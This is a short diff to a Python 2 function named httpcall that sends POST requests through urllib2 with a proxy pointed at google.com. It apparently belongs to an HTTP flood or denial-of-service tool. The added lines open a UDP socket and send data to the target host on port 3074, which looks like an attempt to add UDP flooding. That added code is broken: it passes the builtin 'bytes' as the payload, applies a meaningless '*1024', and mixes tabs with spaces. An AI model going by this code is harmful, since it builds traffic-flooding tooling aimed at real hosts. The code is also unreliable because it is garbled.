@@ -84,13 +84,14 @@ def httpcall(url):
 	request.add_header('Content-type', 'application/x-www-form-urlencoded')
 	request.add_header('Host', host)
         request.get_method = lambda: "POST"
-        proxy_support = urllib2.ProxyHandler({'http': 'www.google.com:80'})
+        proxy_support = urllib2.ProxyHandler({'http': 'http://www.google.com'})
         opener = urllib2.build_opener(proxy_support)
         urllib2.install_opener(opener)
-	
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	try:
 		
 			urllib2.urlopen(request)
+			s.sendto(bytes,(host,3074)) *1024
 	except socket.error as e:
 			#print e.code
 			set_flag(1)
